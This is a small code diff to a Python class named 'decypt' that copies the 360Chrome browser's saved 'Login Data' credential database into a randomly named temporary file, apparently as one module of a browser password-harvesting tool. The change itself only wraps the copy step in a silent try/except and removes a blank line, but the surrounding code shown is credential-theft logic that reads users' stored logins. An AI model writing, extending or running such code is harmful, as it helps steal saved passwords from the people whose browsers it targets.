@@ -27,10 +27,12 @@ class decypt():
         return ''.join(random.sample(string.ascii_letters + string.digits,8))
 
     def copy_db(self,db_path,database_path):
-
-        if os.path.isfile(db_path):
-            shutil.copy(db_path, database_path)
-        return database_path
+        try:
+            if os.path.isfile(db_path):
+                shutil.copy(db_path, database_path)
+            return database_path
+        except Exception:
+            pass
 
     def clean_file(self, db_path):
         try:
@@ -61,7 +63,6 @@ class decypt():
             os.remove(databases)
 
     def get_decypt_360chrome(self):
-
         file_path = os.path.join(
             constant.profile['LOCALAPPDATA'],r'360Chrome\Chrome\User Data\Default\Login Data')
         databases = self.copy_db(file_path,tmp + os.sep + self.str_rangdom())
